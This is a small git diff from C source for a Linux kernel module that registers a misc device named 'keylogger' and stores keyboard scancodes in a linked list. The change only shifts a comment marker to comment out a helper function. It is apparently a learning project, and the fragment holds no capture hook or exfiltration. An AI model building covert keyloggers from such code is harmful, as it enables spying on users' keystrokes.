@@ -63,7 +63,7 @@ static struct miscdevice	key_dev = {
         .name = "keylogger",
         .fops = &key_ops
 };
-
+/*
 t_keylst		*find_last_list_element(t_keylst *full_lst)
 {
 	t_keylst	*tmp_lst;
@@ -73,7 +73,7 @@ t_keylst		*find_last_list_element(t_keylst *full_lst)
 		tmp_lst = tmp_lst->next;
 	return tmp_lst;
 }
-/*
+
 t_keylst		*init_node(t_keylst *node, unsigned char scancode)
 {
 	node->key = scancode & KBD_SCANCODE_MASK;
